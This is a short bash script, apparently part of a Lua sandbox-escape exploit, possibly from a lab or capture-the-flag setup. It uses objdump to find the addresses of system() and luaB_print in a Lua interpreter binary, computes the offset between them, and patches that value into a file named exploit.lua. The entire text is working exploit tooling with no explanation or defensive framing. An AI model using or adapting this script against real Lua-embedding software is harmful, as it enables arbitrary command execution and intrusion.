#!/bin/bash
system_address=$(objdump -d /LUA/lua/lua |grep -Po "[0-9a-f]+ (?=\<system@GLIBC_2.2.5\>)")
print_address=$(objdump -d /LUA/lua/lua |grep -Po "[0-9a-f]+ (?=\<luaB_print\>\:)")
address_diff=$((0x${system_address} - 0x${print_address}))

sed -i "s|ADDR_DIFF|${address_diff}|" /LUA/exploit.lua